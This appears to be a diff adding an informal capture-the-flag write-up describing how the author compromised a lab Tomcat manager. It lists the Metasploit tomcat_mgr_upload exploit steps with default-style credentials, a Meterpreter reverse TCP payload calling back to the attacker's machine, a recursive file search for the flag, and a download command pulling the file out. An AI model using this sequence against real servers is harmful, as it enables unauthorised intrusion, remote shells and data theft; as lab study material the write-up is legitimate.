@@ -1,0 +1,37 @@
+download "C:\\ProgramData\\Tomcat9\\flag{cd699a5719c85f42937554887f2c97f1cac37786abffa7}.jpg" /home/kali/Desktop/flag.jpg
+this is the command used to send the flag over to mine and here is the steps i did to
+open the metasploit console to do the needful
+
+NOTES ON HOW TO USE METASPLOIT IS NOT IN THIS DOCUMENT
+
+Step 1
+
+msfconsole
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 10.0.3.197
+set RPORT 8282
+set HttpUsername root
+set HttpPassword 1234
+set LHOST 192.168.0.8
+set payload java/meterpreter/reverse_tcp
+exploit
+
+then in the meterpreter, type shell
+then i had access to the shell and shows all the folders and shit
+bascially had access to the terminal of the tomcat manager thing
+then I used differnt commands to find the flag
+
+i tried to find the flag but thers no text string in the ones i found, so i 
+tried to check the files names if they contain the keyword cd699a
+the command used for that is as follows
+
+dir /s /b C:\ - Lists all files/folders on C:\ drive recursively in bare format
+| - Pipes the output to the next command
+findstr /i "cd699a" - Filters for lines containing "cd699a" (case-insensitive due to /i)
+
+and this is the actual command 
+
+dir /s /b C:\ | findstr /i "cd699a"
+
+this is what i need to do but with the password i got the 90b3
+
